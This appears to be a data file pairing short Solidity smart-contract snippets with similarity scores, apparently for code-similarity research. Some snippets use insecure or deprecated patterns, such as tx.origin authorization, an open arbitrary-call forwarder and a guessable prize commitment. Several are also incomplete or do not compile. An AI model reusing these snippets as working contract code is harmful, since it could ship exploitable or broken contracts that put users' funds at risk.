    event Sent(address sender, address origin, address shipper, address carrier, address receiver, uint objCount);

    function ShippingOrder(address TA2) {
        t = TA2_Transfer(TA2);
        oBalances[msg.sender] = 200;
    }
    function getBalance(address _sender) returns(uint) {
        return oBalances[_sender];
    }
    function sendOrder(address oOrigin, address oShipper, address oCarrier,  address oReceiver, uint256 oCount) 
        payable 
        returns(bool success) 
    {
        if(!t.sendToReceiver(oOrigin, oShipper, oCount)) throw;
        if(!t.sendToReceiver(oShipper, oCarrier, oCount)) throw;
        if(!t.sendToReceiver(oCarrier, oReceiver, oCount)) throw;
        Sent(msg.sender, oOrigin, oShipper, oCarrier, oReceiver, oCount);
        return true;
    }
}",0.6468011231960179,"contract MultiSend {



  struct Receiver {

    address addr;

    uint amount;

  }



  event MultiTransfer (

    address from,

    uint total,

    Receiver[] receivers

  );



  address owner;



  constructor () public {

    owner = msg.sender;

  }



  modifier onlyOwner() {

    require(owner == msg.sender, ""msg sender is not owner!"");

    _;

  }



  function close() public onlyOwner {

    selfdestruct(owner);

  }



  function _safeTransfer(address _to, uint _amount) internal {

      require(_to != 0);

      _to.transfer(_amount);

  }



  function multiTransfer(address[] _addresses, uint[] _amounts)

    payable public returns(bool)

  {

      require(_addresses.length == _amounts.length);

      Receiver[] memory receivers = new Receiver[](_addresses.length);

      uint toReturn = msg.value;

      for (uint i = 0; i < _addresses.length; i++) {

          _safeTransfer(_addresses[i], _amounts[i]);

          toReturn = SafeMath.sub(toReturn, _amounts[i]);

          receivers[i].addr = _addresses[i];

          receivers[i].amount = _amounts[i]; 

      }

      emit MultiTransfer(msg.sender, msg.value, receivers);

      return true;

  }

}"
"contract A {
  uint public createdTimestamp;
  function A() {
    createdTimestamp = block.timestamp;
  }
}",0.6418729959072931,"contract B {

    function getBlock() public view returns (uint256) {

        return block.timestamp;

    }

}"
"contract test {
    struct Record {
        string name;
        string homeAddress;
    }

    Record[] public records;

    function AddRecord(string Address , string Name) public {
        Record memory newRec = Record({
            name : Name,
            homeAddress : Address
        });

        records.push(newRec);
    }

    function recordsArrayLength() public view returns(uint256){
        return records.length;
    }

}",0.6044158586378731,"contract CryptoPeopleName {

    address owner;

    mapping(address => string) private nameOfAddress;

  

    function CryptoPeopleName() public{

        owner = msg.sender;

    }

    

    function setName(string name) public {

        nameOfAddress[msg.sender] = name;

    }

    

    function getNameOfAddress(address _address) public view returns(string _name){

        return nameOfAddress[_address];

    }

    

}"
"contract test {

    struct A {
      uint8[3] a;
    }

    A a = A([1,2,3]); 

    function getb() returns(uint8[3] whatWeGot) {
        return a.a;
    }
}",0.6418749899910657,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract ParentContract {
  ChildContract _contract;

  function createChildContract(address owner) public {
    _contract = new ChildContract(owner);
  }

  function getContractAddress() public constant returns (address) {
    return address(_contract);
  }
}",0.6435566172101206,"contract Utils {

    string constant public contract_version = ""0.4.0"";



    

    

    

    

    function contractExists(address contract_address) public view returns (bool) {

        uint size;



        assembly {

            size := extcodesize(contract_address)

        }



        return size > 0;

    }

}"
"contract StoreIntegerValue {
    address owner;
    int sensorData;

    function StoreIntegerValue() {
        owner = msg.sender;
    }

    function setSensorData(int _sensorData) {
        require(msg.sender == owner);
        sensorData = _sensorData;
    }

    function getSensorData() constant returns (int) {
        require(msg.sender == owner);
        return sensorData;
    }
}",0.6241112158390292,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract UserRegistration {
    function getUserData(address userAddress) public constant returns(string, uint) {
        string memory Firstname = ""Hello"";
        uint number=123;
        return( Firstname,number);
    }
}",0.6243823449635424,"contract ManagerInterface {



  function getAppId(

    string _appNickname

  )

  external

  constant returns (uint);





  function setIdentity(

    uint _appId,

    address _address,

    string _uid

  )

  external;



}"
"contract SimpleStore {
  function testGas1(uint a, uint b) {
    if (a == 1 && b == 2) {

    }
  }

  function testGas2(uint a, uint b) {
    if (true) {

    }
  }
}",0.6780048985664733,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract Numbers {
    int[] public numbers;

    function Numbers() public {
        numbers.push(20);
        numbers.push(32);
    }
}",0.6712399941736464,"contract number {

    

    bytes32 public number;

    

    function winner(uint _theNumber) {

        number = keccak256(_theNumber);

    }

    

    

    

}"
"contract Game {
  address[] public winners;
  function declareWinner(address winner) public onlyOwner returns(bool success) {
    winners.push(winner);
    emit LogWinnerDeclared(msg.sender, winner);
  }
}",0.6251422049104809,"contract owned {

    address public owner = msg.sender;



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address newOwner) onlyOwner public {

        owner = newOwner;

    }

}"
"contract ReadConvertUint256Bytes {

    function equal(uint a) constant returns (bool) {
        uint x = 0;
        for (uint i = 0; i < 32; i++) {
            uint b = uint(msg.data[35 - i]);
            x += b * 256**i;
        }
        return a == x;
    }

}",0.6399120026985279,"contract Helper {

    function toString(address x) internal pure
        returns (string)
    {
        bytes memory b = new bytes(20);
        for (uint i = 0; i < 20; i++)
            b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
        return string(b);
    }
}"
"contract Sharer {
    function sendHalf() public payable {
        require(msg.value % 2 == 0, ""Even value required."");
    }
}",0.6014030857483923,"contract ERC20Burnable is ERC20 {

  function burn(uint256 value) public {

    _burn(msg.sender, value);

  }

}"
"contract SimplestMultiWallet is Multiownable {
    function transferTo(address to, uint256 amount) onlyManyOwners {
        to.transfer(amount);
    }
}",0.6075353419995786,"contract WithdrawalContract is owned {

    function withdraw() public onlyOwner {
        uint amount = address(this).balance;
        msg.sender.transfer(amount);
    }
}"
"contract Test {

    uint256 public max_contribution = 50 ether; 
    uint256 public min_contribution = 0.1 ether; 

    function transfer() public payable returns (bool success) {
        require(msg.value >= min_contribution);
        require(msg.value <= max_contribution);
        return true;
    }
}",0.6432219111429565,"contract TokenTransfer {

    

    function transfer(address _to, uint256 _value) public returns (bool success);

    function decimals() public view returns (uint8 tokenDecimals);

    function balanceOf(address _owner) public view returns (uint256 balance);

}"
"contract Payments {

    address public owner;

    mapping(address => uint) amountReceived;

    event LogWithdrawal(uint amount);
    event LogPayment(address indexed sender, uint amount); 

    modifier onlyOwner {
        if(msg.sender != owner) throw;
        _;
    } 

    function Payments() {
        owner = msg.sender; 
    }

    function pay() payable returns(bool success) {
        if(msg.value==0) throw; 
        amountReceived[msg.sender] += msg.value; 
        LogPayment(msg.sender, msg.value); 
        return true;
    }

    function getReceived(address user) constant returns(uint received) {
        return amountReceived[msg.sender]; 
    }

    function withdrawFromContract(uint amount) onlyOwner returns(bool success) {
        if(amount > this.balance) throw; 
        if(msg.sender.send(amount)) {
            LogWithdrawal(amount);
            return true;
        } else {
            throw;
        }
    }

}",0.6696034106056146,"contract SimpleLotto {
    int public playCount = 0;
    address public owner = msg.sender;
    mapping (address => uint) public players;
    Aggregate public aggregate;

  struct Aggregate {
    uint msgValue;
    uint gas;
  }

    modifier onlyBy(address _account) {
        if (msg.sender != _account)
            throw;
        _
    }
    
    function SimpleLotto() {
        playCount = 42;
    }
    
    event Sent(address from, address to, int amount);
    
    function play(address receiver, uint amount) returns (uint){
        playCount++;
        Sent(owner, receiver, playCount);
        players[receiver] += amount;
        
        aggregate.msgValue = msg.value;
        aggregate.gas = msg.gas;
        
        return msg.value;
    } 

    function terminate() { 
        if (msg.sender == owner)
            suicide(owner); 
    }
    
    function terminateAlt() onlyBy(owner) { 
            suicide(owner); 
    }
}"
"contract MyContract {
  function myFunction(address tokenAddr) {
    ERC20Token tok = ERC20Token(tokenAddr);
    tok.transferFrom(_owner, _recipient, 100);
  }
}",0.6137626556353442,"contract ERC20Token {
  function transferFrom(address from, address to, uint value);
  function transfer(address recipient, uint256 amount);
}"
"contract Vote {

  struct VoteStruct {
    bool wasCast;
    
  }

  bytes32[] public voteList;
  mapping(bytes32 => VoteStruct) public voteStructs;

  function getVoteCount() public constant returns(uint voteCount) {
    return voteList.length;
  }   
}",0.6143910092249928,"contract SaveInt{

    constructor() public {

    }

    mapping (string=>uint) data;

    function setStr(string key, uint value) public {

        data[key] = value;

    }

    function getStr(string key) public constant returns(uint){

        return data[key];

    }

}"
"contract MyContract {
    function getFlag() public returns (bytes1) {
        return MyLib.AWESOME_FLAG;
    }
}",0.6488015156723002,"contract B {

    function getBlock() public view returns (uint256) {

        return block.timestamp;

    }

}"
"contract Score {

    uint24[] score;

    function addScore(uint24 s) public returns (uint24[] memory) {
        score.push(s);
        return score;
    }

    function getLength() view public returns (uint) {
        return score.length;
    }

    function clearArray() public returns (uint24[] memory) {
        delete score;
        return score;
    }
}",0.6304107235186992,"contract ERC20Token {

  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  function mint(address _to, uint256 _amount) public returns (bool);
  function totalSupply() public returns (uint256);

}"
"contract Factory {

  function createContract() returns(address created) {
    Created c = new Created(msg.sender); 
    return c;
...",0.6581657665489604,"contract Context {
	
	
	constructor() internal {}
	

	function _msgSender() internal view returns (address) {
		return msg.sender;
	}
}"
"contract User {
    address greeting;

    constructor(address _greeting) public {
        greeting = _greeting;
    }

    function Set(string w) public {
        Greeting(greeting).Set(w);
    }

    function Get() public view returns(string) {
        return Greeting(greeting).Greet(""Bob"");
    }
}",0.6721925790021435,"contract Greeter is Mortal {

    

    string greeting;



    

    constructor() public {

        greeting = ""Well, hello there! I am Gruvin's first Ethereum contract!"";

    }



    

    function greet() public constant returns (string) {

        return greeting;

    }

}"
"contract Users {
    mapping (bytes32 => address) public users;

    function register(bytes32 name) {
        if(users[name] == 0x0 && name != """"){
            users[name] = msg.sender;

        }
    }

    function checkAvailability(bytes32 name) returns (bool) {
      if(users[name] == 0x0) {
        return true;
      }
      return false;
    }

}",0.6488389653719118,"contract IOldInviteData{

    

    function checkUp(address addr,bytes32 name) public view returns (uint8);

    function GetAddressByName(bytes32 name) public view returns (address);

    function m_addrToName(address addr) public view returns (bytes32 name);

        

}"
"contract Crowdfunding {
    struct Request {
       string description;
       uint value;
       address recipient;
       bool complete;
     }

    address public manager;
    uint public minimumContribution;
    address[] public approvers;

    function Crowdfunding(uint minimum) public {
        manager = msg.sender;
        minimumContribution = minimum;
    }
}",0.6138248960504257,"contract IBadBitCasino {
	function add(address _user, uint _amount) public payable returns(bool);
	function placeBet(address _user, uint _betId, uint _amount, bool bonus) public;
	function getCurrentBalance(address _user) public view returns(uint);
	function sendEthToGame(uint _amount) public;
}"
"contract B {
  function xyz(string _a) {
  A a = A(contact address);
  address addr = a.abc(_a);
  
  }
}",0.62959660865347,"contract AddressSet {
  function contains (address _address) public view returns (bool);
}"
"contract B {
    A a;
    function B(address _a) {
        a = A(_a);
    }
    ....
}",0.6380016308971111,"contract Caller {
    function callAddress(address a) {
        a.call();
    }
}"
"contract Numbers {
    int[] public numbers;

    function Numbers() public {
        numbers.push(20);
        numbers.push(32);

        int[] storage myArray = numbers;
        myArray[0] = 1;
    }
}",0.6028673983078282,"contract Number {



  mapping(address => uint) public numberForAddress;



  function setNumber(uint number) external {

    numberForAddress[msg.sender] = number;

  }



}"
"contract Ballot {
    function concatenate(bytes32 x, bytes32 y) public pure returns (bytes memory) {
        return abi.encodePacked(x, y);
    }
}",0.6525490326867182,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract Test {

    function forward(address destination, bytes memory data) public { 
        (bool res, ) = destination.call(data);
        assert(res);
    }
}",0.6685957310428106,"contract ContractReceiver {
    function tokenFallback(address _from, uint _value, bytes memory _data) public returns (bool);
}"
"contract Thingy {
    uint public thing = 1;

    function doubler(uint input) public view returns (uint) {
        thing = input * 2;
        return thing;
    }

    function test() public {
        doubler(thing);
    }
    function getDoubler() public view returns(uint){
        return thing;
    }
}",0.6921235025891744,"contract SaiTub {
    function tab(bytes32 cup) public returns (uint);
    function rap(bytes32 cup) public returns (uint);
    function din() public returns (uint);
    function chi() public returns (uint);
    function rhi() public returns (uint);
}"
"contract Test {

    mapping(uint256 => uint256) contributors;

    function distribute() public returns (uint256) {
        contributors[0] = 10;
        uint256 val = contributors[0];
        return val / 20 * 10;
    }
}",0.6651874250269759,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract B { 

    address private hub;
    address private owner;

    function B(address _owner) {
        hub = msg.sender; 
        owner = _owner;
    }

    function getCreatedByHub() constant returns(address contractHub) {
        return hub;
    }

    function getContractOwner() constant returns(address contractOwner) {
        return owner; 
    }

    
    function getAInfo(address contractAddress) constant returns(address owner) {
        address randomInquiryToA = A(hub).getContractOwner(contractAddress);
        return randomInquiryToA;
    }
}",0.6165867595138924,"contract Metadata {
    
    address public owner;
    
    mapping (uint => address) registerMap;

    function Metadata() public {
        owner = msg.sender;
        registerMap[0] = msg.sender;
    }

    
    function getAddress (uint addressId) public view returns (address){
        return registerMap[addressId];
    }

    
    
    
    
    
    function addAddress (uint addressId, address addressContract) public {
        assert(addressContract != 0x0 );
        require (owner == msg.sender || owner == tx.origin);
        registerMap[addressId] = addressContract;
    }
}"
"contract ApprovalContract {

    address public sender;
    address payable public receiver;
    address public constant approver = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;

    function deposit(address payable _receiver) external payable{
        require(msg.value > 0);
        sender = msg.sender;
        receiver = _receiver;
    }

    function viewApprover() external pure returns(address) {
        return(approver);
    }

    function approve() external{
        require(msg.sender == approver);
        receiver.transfer(address(this).balance);
    }
}",0.6303778427514065,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function () payable external {

        emit Deposit(msg.value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract Greeter {
  event _Greet(string name);

  function greet(string name) public {
    _Greet(name);
  }
}",0.6200309751086285,"contract ReverseRegistrarRef {
    function setName(string name) public returns (bytes32 node);
}"
"contract Test {
    bool public projectPaid = false;
    uint public amountRaised = 0;

    function payout() returns (uint) { 
        if (projectPaid) return 3;
        projectPaid = true;
        if (!msg.sender.send(amountRaised)) { 
            projectPaid = false;
            return 4; 
        }
        return 5; 
    }
}",0.6012809699859151,"contract VeredictumTest is Notify
{
    address public vnt;
    
    function setVnt(address _addr) { vnt = _addr; }
    
    function notify(address _from, uint _amount) public returns (bool)
    {
        require(msg.sender == vnt);
        Notified(_from, _amount);
        return true;
    }
}"
"contract A {
    V v = V(0xAddress);

    function bet(uint guess) public payable {
        uint balance = address(this).balance;
        v.roll.value(msg.value)(guess);
        if (address(this).balance < balance) {
            
            
            revert();
        }
    }
}",0.6312716683443559,"contract IDapCarToken {
    function mint(address _address, uint256 _value) public returns (bool);
    function balanceOf(address _owner) public constant returns (uint balance);
}"
"contract delegatedcalled {
  uint public number;
  address public callerAddress;
  function setNumber(uint _number) public {
    number = _number;
    callerAddress = msg.sender;
  }
}",0.6577282210000226,"contract NumberFactory{
    event NumberCreated(address);
    address public last;
 function createNumber(uint _number) public {
     last= new Number(_number);
     NumberCreated(last);
     
    
 } 
}"
"contract Bar {

    Foo foo;

    function Bar(address _foo) public {
        foo = Foo(_foo);
    }

    function testFoo(uint amount) public view returns(uint number) {
        return (foo.a(amount));
    }

}",0.6697817708104764,"contract iDividendToken {

  function checkDividends(address _addr) view public returns(uint _ethAmount);

  function withdrawDividends() public returns (uint _amount);

}"
"contract Example {
    function sendEther(address _addr) public payable {
        _addr.transfer(msg.value);
    }
}",0.663113322936006,"contract sendlimiter{
 function () public payable {
     require(this.balance + msg.value < 100000000);}
}"
"contract Count {
    uint256 private storedData;

    function set(uint256 index, uint256 value) public {
        storedData[index] = value;
    }

    function push(uint256 value) public {
        storedData.push(value);
    }

    function get(uint256 index) public view returns(uint256) {
        return storedData[key]; 
    }
}",0.6955710797335555,"contract Uint256HashTable {

    mapping(uint256 => uint256) public hashTableValues;



    constructor() public {



    }



    function set(uint256 key, uint256 value) public  {

        hashTableValues[key] = value;

    }



    function get(uint256 key) public view returns (uint256 retVal) {

        return hashTableValues[key];

    }

}"
"contract foobar {
    function foo();  
    function bar() {}
}",0.6434327543724404,"contract DummyReceiver {

    
    function start() {
    }

    
    function end() {
    }
}"
"contract Handcuffs {
    address left;
    address right;

    
    function set() {
        if (left == 0x0)
            left = msg.sender;
        else if (right == 0x0)
            right = msg.sender;
        else
            throw;
    }

    
    function get() constant returns (address partner) {
        if (msg.sender == left && right != 0)
            return right;
        else if (msg.sender == right && left != 0)
            return left;
        else
            throw;
    }
}",0.6093507670934061,"contract DSAuth is DSAuthEvents {

    address      public  owner;



    constructor() public {

        owner = msg.sender;

        emit LogSetOwner(msg.sender);

    }



    modifier auth {

        require(isAuthorized(msg.sender));

        _;

    }



    function isAuthorized(address src) internal view returns (bool) {

        if (src == address(this)) {

            return true;

        } else if (src == owner) {

            return true;

        } else {

            return false;

        }

    }

}"
"contract calledContract {
    event callEvent(address sender, address origin, address from);
    function calledFunction() public {
        emit callEvent(msg.sender, tx.origin, address(this));
    }
}",0.6444786300106672,"contract ProxyEventsEmitter {
    function emitTransfer(address _from, address _to, uint _value) public;
    function emitApprove(address _from, address _spender, uint _value) public;
}"
"contract Sub is Token {
    
    function Sub() public {
        owner = msg.sender;
    }

    
    
    
    
    function _give(address _to, uint _value) external onlyOwner {
        balances[_to] += _value;
        require(balances[_to] >= _value);
    }

    
    
    function sell(uint _value) external {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        Main(owner)._give(msg.sender, _value);
    }
}",0.6839359293391833,"contract BurnableToken is BasicToken {



  event Burn(address indexed burner, uint256 value);



  function burn(uint256 _value) public {

    require(_value > 0);

    require(_value <= balances[msg.sender]);



    address burner = msg.sender;

    balances[burner] = balances[burner].sub(_value);

    totalSupply = totalSupply.sub(_value);

    emit Burn(burner, _value);

  }

}"
"contract Store {
    mapping(bytes32 => bytes32) public keyValStore;
    address payable public  owner; 
    uint storeFee;

    constructor(uint fee) public {
        owner = msg.sender;  
        storeFee = fee; 
    }

    function set(bytes32 key, bytes32 value) public payable {
        require(msg.value >= storeFee); 
        owner.transfer(msg.value); 
        keyValStore[key] = value; 
    }

    function get(bytes32 key) public view returns (bytes32) {
        bytes32 val = keyValStore[key]; 
        return val;
    }
}",0.6172183405254299,"contract SimplePrize {
    bytes32 public constant salt = bytes32(987463829);
    bytes32 public commitment;

    function SimplePrize(bytes32 _commitment) public payable {
        commitment = _commitment;   
    }

    function createCommitment(uint answer) 
      public pure returns (bytes32) {
        return keccak256(salt, answer);
    }

    function guess (uint answer) public {
        require(createCommitment(answer) == commitment);
        msg.sender.transfer(this.balance);
    }

    function () public payable {}
}"
"contract NestedArrays {
    uint[][] private nested;
    function test() public {}
}",0.6892240731163702,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract ByteToInt {
    uint public number;
    bytes32 public thebytes32;

    function ByteToInt(bytes32 _number) {
        thebytes32 = _number;
        number = uint(_number);
    }
}",0.6063962502946695,"contract PauseLike {
    function plot(address, bytes32, bytes memory, uint) public;
    function exec(address, bytes32, bytes memory, uint) public;
}"
"contract init {
    address[] public userAddresses;
    function addStudent(address _user) public {
       userAddresses.push(_user);
     }

     function sendToken(uint value)public payable{
         for (uint i=0; i<userAddresses.length; i++) {
             userAddresses[i].transfer(value);
        }
     }

}",0.6862288341014692,"contract newC {
    function sendEth(address payable[] memory _addresses, uint256 _amount) public payable {
        for (uint i=0; i<_addresses.length; i++) {
            _addresses[i].transfer(_amount);
        }
    }
    constructor() public payable{}
    function () payable external{}
}"
"contract E {

    uint public x;

    event LogUpdate(uint newXValue);

    function set(uint _x) public returns(bool success) {
        x = _x;
        LogUpdate(x);
        return true;
    }

}",0.6737748706601718,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}"
"contract F {

    address addressE;

    
    

    function F(address EAddress) {
        addressE = EAddress;
    }

    function setE(uint num) public returns(bool) {
        
        
        EInterface e = EInterface(addressE); 
        return e.set(num);
    }

    function getE() public constant returns(uint E) {
        EInterface e = EInterface(addressE);
        return e.x();  
    }

}",0.6709314432611998,"contract ERC20Interface {
    function balanceOf(address _owner) public constant returns (uint balance) {}
    function transfer(address _to, uint _value) public returns (bool success) {}
    function transferFrom(address _from, address _to, uint _value) public returns (bool success) {}
}"
"contract Nested {

  mapping(string => mapping(int256 => mapping(int256 => address))) mapIndex;

  function getMapIndex(string a, int256 b, int256 c) public view returns(address d) {
      return mapIndex[a][b][c];
  }    

  function setMapIndex(string a, int256 b, int256 c, address d) public returns(bool success) {
      mapIndex[a][b][c] = d;
      return true;
  }
}",0.6462499558614365,"contract TokenERC20 {

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

	function burnFrom(address _from, uint256 _value) public returns (bool success);

	mapping (address => mapping (address => uint256)) public allowance;

	mapping (address => uint256) public balanceOf;

}"
"contract MyContract {
    function read1() external pure returns (uint a, uint b, uint c) {
        uint[3] memory arr;
        arr[0] = 111;
        arr[1] = 222;
        arr[2] = 333;
        assembly {
            a := mload(add(arr,  0))
            b := mload(add(arr, 32))
            c := mload(add(arr, 64))
        }
    }

    function read2() external pure returns (uint a, uint b, uint c) {
        uint[] memory arr = new uint[](3);
        arr[0] = 444;
        arr[1] = 555;
        arr[2] = 666;
        assembly {
            a := mload(add(arr,  0))
            b := mload(add(arr, 32))
            c := mload(add(arr, 64))
        }
    }
}",0.6296630554766076,"contract SafeMath {

  function safeMul(uint a, uint b) internal pure returns (uint) {
    uint c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function safeSub(uint a, uint b) internal pure returns (uint) {
    assert(b <= a);
    return a - b;
  }
  function safeAdd(uint a, uint b) internal pure returns (uint) {
    uint c = a + b;
    assert(c >= a && c >= b);
    return c;
  }

  modifier onlyPayloadSize(uint numWords) {
     assert(msg.data.length >= numWords * 32 + 4);
     _;
  }

}"
"contract Storage {

    address approvedAddress;

    function update( __MORE_HERE__) public {
        if(msg.sender == approvedAddress){
          
        }
    }
}",0.6375232205996814,"contract ERC20Approve {
    function approve (address spender, uint256 amount) public returns (bool);
}"
"contract Auctions is CToken {
    
    function __ownerOf(uint256 _horseId) external view returns(address _owner) {
        _owner = idToOwner[_horseId];
        require(_owner != address(0));
    }
}",0.6549712979206954,"contract Owned {

    

    address public owner;

    

    function isOwner() internal returns (bool) { return msg.sender == owner; }

    

    function Owned() { owner = msg.sender; }

}"
"contract TokenBase {
    uint _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
}",0.6980899496454536,"contract ERC20 {
    uint public totalSupply;
   
    function transfer(address to, uint value) public returns(bool ok);  
}"
"contract Token is TokenBase {
    
    constructor() public {
        _totalSupply = 1234; 
    }
}",0.6313671421873521,"contract Token {

	uint8 public decimals;



  	constructor () public {

		decimals = 24;

  	}

}"
"contract Mapping {

    mapping(uint => address) map;
    uint[] ids;

    function mapAddr(address addr, uint id) public {
        map[id] = addr;
        ids.push(id);
    }

    function getAddr(uint id) public returns (address) {
        return map[id];
    }
}",0.6709743461821426,"contract VatLike {
    function ilks(bytes32) public view returns (uint, uint, uint, uint, uint);
    function hope(address) public;
    function frob(bytes32, address, address, address, int, int) public;
}"
"contract Shop {
  address owner;

  string name;
  string type;
  struct Product {
    string code;
    uint unitPrice;
  }
  mapping(string => Product) products;

  function placeOrder(string productCode, uint qty) {
    ....
  }
}",0.6027152507753449,"contract CodexBeta {
    struct MyCode {
        string code;
    }
    event Record(string code);
    function record(string code) public {
        registry[msg.sender] = MyCode(code);
    }
    mapping (address => MyCode) public registry;
}"
"contract ShopRegistry {
  mapping(string => address) shops;

  function getShop(string name) returns (address) {
    return shops[name];
  }
}",0.6189538814443792,"contract IGetBancorAddressFromRegistry{
  function getBancorContractAddresByName(string _name) public view returns (address result);
}"
"contract KrakenPriceTicker is usingOraclize {

    uint public ETHUSD;

    event newOraclizeQuery(string description);
    event newKrakenPriceTicker(string price);

    function KrakenPriceTicker() {
        
        
        update(0);
    }

    function __callback(bytes32 myid, string result, bytes proof) {
        if (msg.sender != oraclize_cbAddress()) throw;
        newKrakenPriceTicker(result);
        ETHUSD = parseInt(result, 2); 
        
        
    }

    function update(uint delay) payable {
        if (oraclize_getPrice(""URL"") > this.balance) {
            newOraclizeQuery(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
        } else {
            newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");
            oraclize_query(delay, ""URL"", ""json(https:
        }
    }

}",0.6607094382280752,"contract DrawContract is usingOraclize {



    mapping(bytes32 => bool) validIds;



    event LogQueryId(bytes32 queryId);

    event LogNewOraclizeQuery(string description);



    address owner;



    constructor () payable public{

        owner = msg.sender;

    }



    function __callback(bytes32 myid) public {

        if (!validIds[myid]) revert();

        if (msg.sender != oraclize_cbAddress()) revert();

        delete validIds[myid];

    }



    function draw(string url, string lotterySlug, string drawDate) payable external {

        require(msg.sender == owner);

        if (oraclize_getPrice(""URL"") > address(this).balance) {

            emit LogNewOraclizeQuery(""false"");

        } else {

            bytes32 queryId = oraclize_query(""URL"", url);

            validIds[queryId] = true;

            emit LogQueryId(queryId);

            emit LogNewOraclizeQuery(""true"");

        }

    }

}"
"contract B is A {
  uint8 public b1;

  function B(address _a) A(_a) {
  }
}",0.6860127030715614,"contract DAO {

        function balanceOf(address addr) public returns (uint);

    }"
"contract C {

  address public owner; 
  address public creator;

  function C(address _creator, address _owner) public {
    owner = _owner;
    creator = _creator;
  }

  function() public payable {}

  function printOwner() public view returns(address h) {
      h = owner;
  }

}",0.6886483317260653,"contract Ambi2 {

    function claimFor(address _address, address _owner) public returns(bool);

    function hasRole(address _from, bytes32 _role, address _to) public view returns(bool);

    function isOwner(address _node, address _owner) public view returns(bool);

}"
"contract Amortized {

  mapping(address => uint) balances;

  modifier amortizeWork {
     uint c = balanceOf(msg.sender);
     if(balances[msg.sender] != c {
        ??? 
        balances[msg.sender] = c; 
     }
  }

  function balanceOf(address a) public view returns(uint computedBalance) {
    computedBalance = balances[a] + ... 
  }

  function doSomething() public amortizeWork ...",0.6788721429078096,"contract Escrow {
    mapping (address => uint) public balances;

    function deposit(address _recipient) payable {
        require(msg.value > 0);
        balances[_recipient] += msg.value;
    }

    function claim() {
        uint balance = balances[msg.sender];
        require(balance > 0);

        balances[msg.sender] = 0;
        bool claimed = msg.sender.call.value(balance)();

        require(claimed);
    }
}"
"contract Interfacing {

    Interface daContract; 

    constructor(address theContract) public {
        daContract = Interface(theContract);
        require(daContract.isInterface());
    }

    function call() public view returns (string) {
        return daContract.call();
    }

}",0.6021918083910066,"contract Utils {

    string constant public contract_version = ""0.4.0"";



    

    

    

    

    function contractExists(address contract_address) public view returns (bool) {

        uint size;



        assembly {

            size := extcodesize(contract_address)

        }



        return size > 0;

    }

}"
"contract A {
    B public b;
    constructor(B _b) public {
        
        b = _b;
    }
    function bar() public {
        
        b.foo(1234);
    }
}",0.6133649263775628,"contract Reclaimable is Ownable {

    
    constructor() public payable {
    }

    
    function() public payable {
    }
}"
"contract Relay is MetaCoin {
address public owner;
uint public count;
address[] oracles;
uint public fee;


  function Relay() {
    owner = msg.sender;
    count = 0;
    fee = 10;
  }


  function fundRelay() payable returns (bool) {
    if (owner != msg.sender) throw;

  }

function approveExternalTransaction(address receiver) {
    count++;
    if (count == 3) {
      releaseFunds(receiver);
    }
  }

function releaseFunds (address receiver) {
    sendCoin(receiver, fee);
 }
}",0.6602852391118088,"contract ERC20 is ERC20Basic {

  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



  function approve(address spender, uint256 value) public returns (bool);

  event Approval(

    address indexed owner,

    address indexed spender,

    uint256 value

  );



  function () public payable {

    revert();

  }

}"
"contract Timestamping {
 event logTimestamp(bytes32 indexed _documentReference, uint256 timestamp, address _from);
 function timestamp(bytes32 _documentReference) {
   emit logTimestamp(_documentReference, now, msg.sender);
 }
}",0.6291928686388093,"contract Timestamper {

    address private owner; 

    event Timestamp(bytes32 sha256);



    constructor() public {

        owner = msg.sender;

    }

    function dotimestamp(bytes32 _sha256) public {

        require(owner==msg.sender);

        emit Timestamp(_sha256);

    }

}"
"contract B {

  A a; 

  function B(address aAddress) public { 
    a = A(aAddress);
  }

  function getSomethingFromA() public view returns(bytes32 theThing) {
    return a.something();
  }
}",0.6847372859085071,"contract Manager {
    function isAllowed(address _actor, bytes32 _role) public view returns (bool);
    function hasAccess(address _actor) public view returns (bool);
}"
"contract Crowdsale {
    iERC20 token;
    address owner;
    uint rateMillionths;

    modifier ownerOnly() {
        require(msg.sender == owner);
        _;
    }

    
    
    function Crowdsale(address _main) public {
        token = iERC20(_main);
        owner = msg.sender;
        rateMillionths = 1000000;
    }

    
    function withdraw() public ownerOnly {
        owner.transfer(this.balance);
    }

    
    
    
    function setRate(uint _rateMillionths) public ownerOnly {
        rateMillionths = _rateMillionths;
    }

    
    
    function () public payable {
        uint value = msg.value * rateMillionths;
        
        require(value/msg.value == rateMillionths);
        value = value / 1000000;
        token.transfer(msg.sender, value);
    }
